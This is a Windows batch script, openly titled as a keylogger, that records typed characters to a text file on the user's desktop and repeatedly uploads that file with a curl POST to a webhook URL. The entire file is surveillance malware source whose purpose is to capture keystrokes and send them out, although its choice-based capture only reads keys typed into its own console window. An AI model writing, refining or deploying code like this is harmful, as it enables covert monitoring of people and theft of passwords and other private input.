@echo off
cls
title Keylogger-Batch Ver. 1.0
set "list=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set entry=

:: Create log file if it doesn't exist
if not exist "%userprofile%\desktop\keylogger.txt" (
  echo Keylogger started at %date% %time% > "%userprofile%\desktop\keylogger.txt"
)

:: Main loop to capture and send keystrokes
:loop
set a=
choice /n /c "%list%" /CS
set /a a=%errorlevel%-1

:: Create temp variables and check which key is pressed
set temp_list=%list%
set b=0
:check_key
if "%b%" neq "%a%" (
  set temp_list=%temp_list:~1%
  set /a b=%b%+1
  goto check_key
)
set "entry=%entry%%temp_list:~0,1%"
echo %entry% >> "%userprofile%\desktop\keylogger.txt"

:: Send log file to webhook if it exists and is not empty
if exist "%userprofile%\desktop\keylogger.txt" (
  for %%A in ("%userprofile%\desktop\keylogger.txt") do if %%~zA gtr 0 (
    curl -d "@%userprofile%\desktop\keylogger.txt" -H "Content-Type: text/plain" -X POST http://localhost:3000/webhook
  )
)

:: Wait for 30 seconds before next iteration
timeout /t 30 /nobreak >nul
goto loop
